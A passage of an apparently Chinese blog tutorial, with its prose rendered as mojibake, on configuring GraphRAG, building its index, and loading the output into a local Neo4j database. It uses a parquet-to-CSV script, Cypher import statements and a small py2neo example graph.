class="line">  ## parallelization: override the global parallelization settings for this task</span><br><span class="line">  ## async_mode: override the global async_mode settings for this task</span><br><span class="line">  # enabled: true</span><br><span class="line">  prompt: &quot;prompts/claim_extraction.txt&quot;</span><br><span class="line">  description: &quot;Any claims or facts that could be relevant to information discovery.&quot;</span><br><span class="line">  max_gleanings: 0</span><br><span class="line"></span><br><span class="line">community_reports:</span><br><span class="line">  ## llm: override the global llm settings for this task</span><br><span class="line">  ## parallelization: override the global parallelization settings for this task</span><br><span class="line">  ## async_mode: override the global async_mode settings for this task</span><br><span class="line">  prompt: &quot;prompts/community_report.txt&quot;</span><br><span class="line">  max_length: 2000</span><br><span class="line">  max_input_length: 8000</span><br><span class="line"></span><br><span class="line">cluster_graph:</span><br><span class="line">  max_cluster_size: 10</span><br><span class="line"></span><br><span class="line">embed_graph:</span><br><span class="line">  enabled: false # if true, will generate node2vec embeddings for nodes</span><br><span class="line">  # num_walks: 10</span><br><span class="line">  # walk_length: 40</span><br><span class="line">  # window_size: 2</span><br><span class="line">  # iterations: 3</span><br><span class="line">  # random_seed: 597832</span><br><span class="line"></span><br><span class="line">umap:</span><br><span class="line">  enabled: false # if true, will generate UMAP embeddings for nodes</span><br><span class="line"></span><br><span class="line">snapshots:</span><br><span class="line">  graphml: false</span><br><span class="line">  raw_entities: false</span><br><span class="line">  top_level_nodes: false</span><br><span class="line"></span><br><span class="line">local_search:</span><br><span class="line">  # text_unit_prop: 0.5</span><br><span class="line">  # community_prop: 0.1</span><br><span class="line">  # conversation_history_max_turns: 5</span><br><span class="line">  # top_k_mapped_entities: 10</span><br><span class="line">  # top_k_relationships: 10</span><br><span class="line">  # llm_temperature: 0 # temperature for sampling</span><br><span class="line">  # llm_top_p: 1 # top-p sampling</span><br><span class="line">  # llm_n: 1 # Number of completions to generate</span><br><span class="line">  # max_tokens: 12000</span><br><span class="line"></span><br><span class="line">global_search:</span><br><span class="line">  # llm_temperature: 0 # temperature for sampling</span><br><span class="line">  # llm_top_p: 1 # top-p sampling</span><br><span class="line">  # llm_n: 1 # Number of completions to generate</span><br><span class="line">  # max_tokens: 12000</span><br><span class="line">  # data_max_tokens: 12000</span><br><span class="line">  # map_max_tokens: 1000</span><br><span class="line">  # reduce_max_tokens: 2000</span><br><span class="line">  # concurrency: 32</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åç»§ç»­æ„å»ºç´¢å¼•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m graphrag.index --root ./test</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨apiæ¥å£åï¼Œè¿™ä¸€æ­¥éª¤æ—¶é—´å°†ç¼©çŸ­è‡³10åˆ†é’Ÿä»¥å†…</p><h3 id="1-4-å¯¹GraphRAGçš„å·¥ä½œæµç¨‹ç®€å•åˆ†æ"><a href="#1-4-å¯¹GraphRAGçš„å·¥ä½œæµç¨‹ç®€å•åˆ†æ" class="headerlink" title="1.4 å¯¹GraphRAGçš„å·¥ä½œæµç¨‹ç®€å•åˆ†æ"></a>1.4 å¯¹GraphRAGçš„å·¥ä½œæµç¨‹ç®€å•åˆ†æ</h3><p>GraphRAGå·¥ä½œæµç¨‹è¾“å‡ºç»“æœ:<br><img src="/img/AI_project/KnowledgeGraph/index.png" alt="image"><br>å¤§è‡´å·¥ä½œåŸç†:<br>æ„å»ºç´¢å¼•é˜¶æ®µ:<br><img src="/img/AI_project/KnowledgeGraph/2.png" alt="image"><br>é—®ç­”é˜¶æ®µ:<br><img src="/img/AI_project/KnowledgeGraph/3.png" alt="image"><br>ç®€è¿°:<br>GraphRAGä¼šå¯¹ç»™å®šçš„æ–‡æœ¬æ–‡ä»¶è¿›è¡Œåˆ†å—å¤„ç†ï¼Œæ¯å—æ–‡æ®µè¿›è¡Œå‘½åå®ä½“è¯†åˆ«ï¼ŒæŠ½å–å…¶ä¸­çš„ç›¸äº’å…³ç³»ï¼Œå†å°†å®ä½“è¿›è¡Œåˆ†ç±»ï¼Œå½¢æˆç¤¾åŒºï¼Œç„¶åå½¢æˆç¤¾åŒºæŠ¥å‘Šï¼Œå®Œæˆç´¢å¼•çš„æ„å»ºã€‚<br>å…¶ä¸­å¤§éƒ¨åˆ†å·¥ä½œæ˜¯ç”±ç»™å®šçš„apiæ¥å£å®Œæˆçš„ã€‚åœ¨graphrag&#x2F;test&#x2F;promptsç›®å½•ä¸‹çš„æ–‡æœ¬æ–‡ä»¶å°±å±•ç¤ºäº†graphragå‘å¤§æ¨¡å‹è¾“å…¥çš„ä¸€äº›å·¥ä½œæŒ‡ä»¤ï¼Œå°†å…·ä½“è¦å®Œæˆçš„å·¥ä½œå†™åœ¨äº†æ–‡æœ¬æ–‡ä»¶é‡Œã€‚<br>åœ¨è¿›è¡Œé—®ç­”æ—¶æœ‰ä¸¤ç§ä¸åŒçš„æ¨¡å¼ï¼Œglobalå’Œlocalï¼Œä¸¤è€…æ‰€é€‚ç”¨çš„é—®é¢˜ç±»å‹æœ‰æ‰€ä¸åŒã€‚<br>globalæ¨¡å¼é€‚åˆå›ç­”å…¨å±€æ€§çš„é—®é¢˜ï¼Œåœ¨å¯¹å„ä¸ªç¤¾åŒºè¿›è¡Œæ€»ç»“åå¾—åˆ°ç»“æœï¼Œæ¶ˆè€—çš„èµ„æºæ¯”è¾ƒå¤§ï¼›<br>localæ¨¡å¼é€‚åˆå›ç­”å±€åŸŸæ€§çš„é—®é¢˜ï¼Œæ¶ˆè€—èµ„æºå°ã€‚</p><h2 id="2-Neo4jå¯è§†åŒ–çŸ¥è¯†å›¾è°±"><a href="#2-Neo4jå¯è§†åŒ–çŸ¥è¯†å›¾è°±" class="headerlink" title="2. Neo4jå¯è§†åŒ–çŸ¥è¯†å›¾è°±"></a>2. Neo4jå¯è§†åŒ–çŸ¥è¯†å›¾è°±</h2><h3 id="2-1-Neo4jéƒ¨ç½²"><a href="#2-1-Neo4jéƒ¨ç½²" class="headerlink" title="2.1 Neo4jéƒ¨ç½²"></a>2.1 Neo4jéƒ¨ç½²</h3><p>neo4jä¸‹è½½åœ°å€:<a href="https://neo4j.com/deployment-center/#enterprise">https://neo4j.com/deployment-center/#enterprise</a><br>è¿›å…¥é¡µé¢:<br><img src="/img/AI_project/KnowledgeGraph/4.png" alt="image">  </p><p>å¾€ä¸‹ç¿»åˆ°:<br><img src="/img/AI_project/KnowledgeGraph/5.png" alt="image">  </p><p>æ³¨æ„é€‰æ‹©ä¸æ”¶è´¹çš„COMMUNITYç‰ˆæœ¬å’ŒWindowsç³»ç»Ÿç‰ˆæœ¬  </p><p>ç‚¹å‡»Downloadåä¼šä¸‹è½½å‹ç¼©åŒ…neo4j-community-5.23.0-windows.zip  </p><p>è§£å‹åå¾—åˆ°æ–‡ä»¶å¤¹neo4j-community-5.23.0-windows.zip  </p><p>å¯ä»¥é€‰æ‹©å°†å…¶ä¸­çš„binç›®å½•è®¾ç½®ä¸ºç¯å¢ƒå˜é‡ï¼Œæ–¹ä¾¿åç»­å‘½ä»¤è¡Œè¾“å…¥  </p><p>é…ç½®å¥½ç¯å¢ƒå˜é‡åè¿è¡Œä»¥ä¸‹å‘½ä»¤å¼€å¯neo4jæœåŠ¡:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j.bat console</span><br></pre></td></tr></table></figure><p>é»˜è®¤æ‰“å¼€7474ç«¯å£ï¼Œåœ¨æµè§ˆå™¨ä¸­æœç´¢ <a href="http://localhost:7474/">http://localhost:7474</a> å³å¯è®¿é—®UIç•Œé¢</p><p>åˆå§‹ç”¨æˆ·åå’Œå¯†ç å‡ä¸º <em><strong>neo4j</strong></em></p><h3 id="2-2-å°†GraphRAGè¿›è¡Œå¯è§†åŒ–æ“ä½œ"><a href="#2-2-å°†GraphRAGè¿›è¡Œå¯è§†åŒ–æ“ä½œ" class="headerlink" title="2.2 å°†GraphRAGè¿›è¡Œå¯è§†åŒ–æ“ä½œ"></a>2.2 å°†GraphRAGè¿›è¡Œå¯è§†åŒ–æ“ä½œ</h3><ol><li><p>ç»è¿‡ç´¢å¼•æ„å»ºåtest&#x2F;output&#x2F;æ—¶é—´æˆ³&#x2F;artifactsç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ç³»åˆ—.parquetæ–‡ä»¶ï¼Œé¦–å…ˆå°†è¿™äº›æ–‡ä»¶è½¬æ¢æˆ.csvæ–‡ä»¶<br>è½¬æ¢ä»£ç :</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pandas as pd</span><br><span class="line">import csv</span><br><span class="line"></span><br><span class="line">parquet_dir = &quot;./output_csv/test6/parquet&quot;   # .parquetæ–‡ä»¶æ‰€åœ¨ç›®å½•</span><br><span class="line">csv_dir = &quot;./output_csv/test6/csv&quot;           # .csvæ–‡ä»¶çš„ç”Ÿæˆå­˜æ”¾ç›®å½•</span><br><span class="line"></span><br><span class="line">def clean_quote(value):</span><br><span class="line">    if isinstance(value, str):</span><br><span class="line">        value = value.strip().replace(&#x27;&quot;&quot;&#x27;, &#x27;&quot;&#x27;).replace(&#x27;&quot;&#x27;, &#x27;&#x27;)</span><br><span class="line">        if &#x27;,&#x27; in value or &#x27;&quot;&#x27; in value:</span><br><span class="line">            value = f&#x27;&quot;&#123;value&#125;&quot;&#x27;</span><br><span class="line">    return value</span><br><span class="line"></span><br><span class="line">for file_name in os.listdir(parquet_dir):</span><br><span class="line">    if file_name.endswith(&#x27;.parquet&#x27;):</span><br><span class="line">        parquet_file = os.path.join(parquet_dir, file_name)</span><br><span class="line">        csv_file = os.path.join(csv_dir, file_name.replace(&#x27;.parquet&#x27;, &#x27;.csv&#x27;))</span><br><span class="line"></span><br><span class="line">        df = pd.read_parquet(parquet_file)</span><br><span class="line"></span><br><span class="line">        for column in df.select_dtypes(include=[&#x27;object&#x27;]).columns:</span><br><span class="line">            df[column] = df[column].apply(clean_quote)</span><br><span class="line"></span><br><span class="line">        df.to_csv(csv_file, index=False, quoting=csv.QUOTE_NONNUMERIC)</span><br><span class="line">        print(f&quot;Converted &#123;parquet_file&#125; to &#123;csv_file&#125; successfully.&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;All Parquet files have been converted to CSV.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>å°†ç”Ÿæˆçš„csvæ–‡ä»¶å¤åˆ¶åˆ°neo4j-community-5.23.0-windows&#x2F;importç›®å½•ä¸‹  </p></li><li><p>å¼€å¯neo4jæœåŠ¡å¹¶è¿›å…¥UIç•Œé¢ï¼Œåœ¨é¡µé¢ä¸Šæ–¹å¤åˆ¶ä»¥ä¸‹å‘½ä»¤å¹¶è¿è¡Œå‘½ä»¤:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">// 1. Import Documents</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_documents.csv&#x27; AS row</span><br><span class="line">CREATE (d:Document &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    title: row.title,</span><br><span class="line">    raw_content: row.raw_content,</span><br><span class="line">    text_unit_ids: row.text_unit_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 2. Import Text Units</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_text_units.csv&#x27; AS row</span><br><span class="line">CREATE (t:TextUnit &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    text: row.text,</span><br><span class="line">    n_tokens: toFloat(row.n_tokens),</span><br><span class="line">    document_ids: row.document_ids,</span><br><span class="line">    entity_ids: row.entity_ids,</span><br><span class="line">    relationship_ids: row.relationship_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 3. Import Entities</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_entities.csv&#x27; AS row</span><br><span class="line">CREATE (e:Entity&#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    name: row.name,</span><br><span class="line">    type: row.type,</span><br><span class="line">    description: row.description,</span><br><span class="line">    human_readable_id: toInteger(row.human_readable_id),</span><br><span class="line">    text_unit_ids: row.text_unit_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 4. Import Relationships</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_relationships.csv&#x27; AS row</span><br><span class="line">CREATE (r:Relationship &#123;</span><br><span class="line">    source: row.source,</span><br><span class="line">    target: row.target,</span><br><span class="line">    weight: toFloat(row.weight),</span><br><span class="line">    description: row.description,</span><br><span class="line">    id: row.id,</span><br><span class="line">    human_readable_id: row.human_readable_id,</span><br><span class="line">    source_degree: toInteger(row.source_degree),</span><br><span class="line">    target_degree: toInteger(row.target_degree),</span><br><span class="line">    rank: toInteger(row.rank),</span><br><span class="line">    text_unit_ids: row.text_unit_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 5. Import Nodes</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_nodes.csv&#x27; AS row</span><br><span class="line">CREATE (n:Node &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    level: toInteger(row.level),</span><br><span class="line">    title: row.title,</span><br><span class="line">    type: row.type,</span><br><span class="line">    description: row.description,</span><br><span class="line">    source_id: row.source_id,</span><br><span class="line">    community: row.community,</span><br><span class="line">    degree: toInteger(row.degree),</span><br><span class="line">    human_readable_id: row.human_readable_id,</span><br><span class="line">    size: toInteger(row.size),</span><br><span class="line">    entity_type: row.entity_type,</span><br><span class="line">    top_level_node_id: row.top_level_node_id,</span><br><span class="line">    x: toInteger(row.x),</span><br><span class="line">    y: toInteger(row.y)</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 6. Import Communities</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_communities.csv&#x27; AS row</span><br><span class="line">CREATE (c:Community &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    title: row.title,</span><br><span class="line">    level: toInteger(row.level),</span><br><span class="line">    raw_community: row.raw_community,</span><br><span class="line">    relationship_ids: row.relationship_ids,</span><br><span class="line">    text_unit_ids: row.text_unit_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 7. Import Community Reports</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_community_reports.csv&#x27; AS row</span><br><span class="line">CREATE (cr:CommunityReport &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    community: row.community,</span><br><span class="line">    full_content: row.full_content,</span><br><span class="line">    level: toInteger(row.level),</span><br><span class="line">    rank: toFloat(row.rank),</span><br><span class="line">    title: row.title,</span><br><span class="line">    rank_explanation: row.rank_explanation,</span><br><span class="line">    summary: row.summary,</span><br><span class="line">    findings: row.findings,</span><br><span class="line">    full_content_json: row.full_content_json</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 8. Create indexes for better performance</span><br><span class="line">CREATE INDEX FOR (d:Document) ON (d.id);</span><br><span class="line">CREATE INDEX FOR (t:TextUnit) ON (t.id);</span><br><span class="line">CREATE INDEX FOR (e:Entity) ON (e.id);</span><br><span class="line">CREATE INDEX FOR (r:Relationship) ON (r.id);</span><br><span class="line">CREATE INDEX FOR (n:Node) ON (n.id);</span><br><span class="line">CREATE INDEX FOR (c:Community) ON (c.id);</span><br><span class="line">CREATE INDEX FOR (cr:CommunityReport) ON (cr.id);</span><br><span class="line">    </span><br><span class="line">// 9. Create relationships after all nodes are imported</span><br><span class="line">MATCH (d:Document)</span><br><span class="line">UNWIND split(d.text_unit_ids, &#x27;,&#x27;) AS textUnitId</span><br><span class="line">MATCH (t:TextUnit &#123;id: trim(textUnitId)&#125;)</span><br><span class="line">CREATE (d)-[:HAS_TEXT_UNIT]-&gt;(t);</span><br><span class="line">    </span><br><span class="line">MATCH (t:TextUnit)</span><br><span class="line">UNWIND split(t.entity_ids, &#x27;,&#x27;) AS entityId</span><br><span class="line">MATCH (e:Entity &#123;id: trim(entityId)&#125;)</span><br><span class="line">CREATE (t)-[:HAS_ENTITY]-&gt;(e);</span><br><span class="line">    </span><br><span class="line">MATCH (t:TextUnit)</span><br><span class="line">UNWIND split(t.relationship_ids, &#x27;,&#x27;) AS relId</span><br><span class="line">MATCH (r:Relationship &#123;id: trim(relId)&#125;)</span><br><span class="line">CREATE (t)-[:HAS_RELATIONSHIP]-&gt;(r);</span><br><span class="line">    </span><br><span class="line">MATCH (e:Entity)</span><br><span class="line">UNWIND split(e.text_unit_ids, &#x27;,&#x27;) AS textUnitId</span><br><span class="line">MATCH (t:TextUnit &#123;id: trim(textUnitId)&#125;)</span><br><span class="line">CREATE (e)-[:MENTIONED_IN]-&gt;(t);</span><br><span class="line">    </span><br><span class="line">MATCH (r:Relationship)</span><br><span class="line">MATCH (source:Entity &#123;name: r.source&#125;)</span><br><span class="line">MATCH (target:Entity &#123;name: r.target&#125;)</span><br><span class="line">CREATE (source)-[:RELATES_TO]-&gt;(target);</span><br><span class="line">    </span><br><span class="line">MATCH (r:Relationship)</span><br><span class="line">UNWIND split(r.text_unit_ids, &#x27;,&#x27;) AS textUnitId</span><br><span class="line">MATCH (t:TextUnit &#123;id: trim(textUnitId)&#125;)</span><br><span class="line">CREATE (r)-[:MENTIONED_IN]-&gt;(t);</span><br><span class="line">    </span><br><span class="line">MATCH (c:Community)</span><br><span class="line">UNWIND split(c.relationship_ids, &#x27;,&#x27;) AS relId</span><br><span class="line">MATCH (r:Relationship &#123;id: trim(relId)&#125;)</span><br><span class="line">CREATE (c)-[:HAS_RELATIONSHIP]-&gt;(r);</span><br><span class="line">    </span><br><span class="line">MATCH (c:Community)</span><br><span class="line">UNWIND split(c.text_unit_ids, &#x27;,&#x27;) AS textUnitId</span><br><span class="line">MATCH (t:TextUnit &#123;id:trim(textUnitId)&#125;)</span><br><span class="line">CREATE (c)-[:HAS_TEXT_UNIT]-&gt;(t);</span><br><span class="line">    </span><br><span class="line">MATCH (cr:CommunityReport)</span><br><span class="line">MATCH (c:Community &#123;id: cr.community&#125;)</span><br><span class="line">CREATE (cr)-[:REPORTS_ON]-&gt;(c);</span><br></pre></td></tr></table></figure><p>æœ€å¥½åœ¨è¿è¡Œè¿™æ®µå‘½ä»¤ä¹‹å‰nei4jæ•°æ®åº“æ²¡æœ‰å…¶ä»–çš„èŠ‚ç‚¹æ•°æ®ï¼Œæœ€å¥½æ˜¯ä¸€æ¬¡æ€§å®Œæˆã€‚</p></li></ol><p>å¦‚æœå‡ºç°æŠ¥é”™ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯é‡æ–°è§£å‹åŸæ¥çš„å‹ç¼©åŒ…ï¼Œé‡æ–°å¼€ä¸€ä¸ªæ–°çš„æ•°æ®åº“ï¼Œç„¶åé‡å¤ä¹‹å‰çš„æ“ä½œ</p><h3 id="2-3-è‡ªè¡Œåˆ›å»ºç®€å•å›¾è°±ç¤ºä¾‹"><a href="#2-3-è‡ªè¡Œåˆ›å»ºç®€å•å›¾è°±ç¤ºä¾‹" class="headerlink" title="2.3 è‡ªè¡Œåˆ›å»ºç®€å•å›¾è°±ç¤ºä¾‹"></a>2.3 è‡ªè¡Œåˆ›å»ºç®€å•å›¾è°±ç¤ºä¾‹</h3><p>å®‰è£…ä¾èµ–åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install py2neo</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„å›¾è°±ç”Ÿæˆç¤ºä¾‹:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import py2neo</span><br><span class="line">from py2neo import Graph, Node, Relationship, NodeMatcher</span><br><span class="line"></span><br><span class="line">g = Graph(&quot;neo4j://localhost:7687&quot;, user=&quot;neo4j&quot;, password=&quot;&quot;)  # å¡«å…¥è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line"></span><br><span class="line">g.run(&#x27;match (n) detach delete n&#x27;)  # è¿è¡Œneo4jè‡ªå·±çš„å‘½ä»¤ï¼Œåˆ é™¤æ‰€æœ‰èŠ‚ç‚¹</span><br><span class="line"></span><br><span class="line"># åˆ›å»ºèŠ‚ç‚¹ï¼ŒæŒ‡å®šæ ‡ç­¾å¹¶å‘½å</span><br><span class="line">testnode1 = Node(&quot;Person&quot;, name=&quot;åˆ˜å¤‡&quot;)</span><br><span class="line">testnode2 = Node(&quot;Person&quot;, name=&quot;å…³ç¾½&quot;)</span><br><span class="line">testnode3 = Node(&quot;Person&quot;, name=&quot;å¼ é£&quot;)</span><br><span class="line"></span><br><span class="line"># æ„å»ºèŠ‚ç‚¹å±æ€§</span><br><span class="line"># ä¹Ÿå¯ä»¥åœ¨åˆ›å»ºæ—¶è®¾ç½®ï¼Œå¦‚testnode1 = Node(&quot;Person&quot;, name=&quot;åˆ˜å¤‡&quot;, country=&quot;èœ€å›½&quot;, age=40, sex=&quot;ç”·&quot;)</span><br><span class="line">testnode1[&#x27;country&#x27;] = &#x27;èœ€å›½&#x27;</span><br><span class="line">testnode1[&#x27;age&#x27;] = 40</span><br><span class="line">testnode1[&#x27;sex&#x27;] = &#x27;ç”·&#x27;</span><br><span class="line"></span><br><span class="line">testnode2[&#x27;country&#x27;] = &#x27;èœ€å›½&#x27;</span><br><span class="line">testnode2[&#x27;age&#x27;] = 35</span><br><span class="line">testnode2[&#x27;sex&#x27;] = &#x27;ç”·&#x27;</span><br><span class="line"></span><br><span class="line">testnode3[&#x27;country&#x27;] = &#x27;èœ€å›½&#x27;</span><br><span class="line">testnode3[&#x27;age&#x27;] = 30</span><br><span class="line">testnode3[&#x27;sex&#x27;] = &#x27;ç”·&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ— æ¡ä»¶åˆ›å»ºèŠ‚ç‚¹ï¼Œå¿…å®šä¼šå¢åŠ èŠ‚ç‚¹ï¼Œä¸è®ºæ˜¯å¦ä¸ä¹‹å‰å·²æœ‰çš„èŠ‚ç‚¹é‡å¤</span><br><span class="line"># g.create(testnode1)</span><br><span class="line"># g.create(testnode2)</span><br><span class="line"># g.create(testnode3)</span><br><span class="line"></span><br><span class="line"># è¦†ç›–å¼åˆ›å»ºèŠ‚ç‚¹ï¼Œæ ¹æ®ç»™å®šæ¡ä»¶è¿›è¡Œè¦†ç›–åˆ›å»º</span><br><span class="line">g.merge(testnode1, &quot;People&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(testnode2, &quot;People&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(testnode3, &quot;People&quot;, &quot;name&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ„å»ºå…³ç³»</span><br><span class="line">friend1 = Relationship(testnode1, &quot;å¤§å“¥&quot;, testnode2)</span><br><span class="line">friend2 = Relationship(testnode2, &quot;äºŒå¼Ÿ&quot;, testnode1)</span><br><span class="line">friend3 = Relationship(testnode1, &quot;å¤§å“¥&quot;, testnode3)</span><br><span class="line">friend4 = Relationship(testnode3, &quot;ä¸‰å¼Ÿ&quot;, testnode1)</span><br><span class="line">friend5 = Relationship(testnode2, &quot;äºŒå“¥&quot;, testnode3)</span><br><span class="line">friend6 = Relationship(testnode3, &quot;ä¸‰å¼Ÿ&quot;, testnode2)</span><br><span class="line">g.merge(friend1, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend2, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend3, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend4, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend5, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend6, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line"></span><br><span class="line"># æŸ¥è¯¢ç›¸å…³å±æ€§</span><br><span class="line">matcher = NodeMatcher(g)</span><br><span class="line">print(matcher.match(&quot;Person&quot;, name=&quot;å¼ é£&quot;).first())</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆæ•ˆæœ:<br><img src="/img/AI_project/KnowledgeGraph/6.png" alt="image">  </p><h3 id="2-4-çŸ¥è¯†å›¾è°±æ„å»ºæ¡ˆä¾‹åˆ†æ"><a href="#2-4-çŸ¥è¯†å›¾è°±æ„å»ºæ¡ˆä¾‹åˆ†æ" class="headerlink" title="2.4 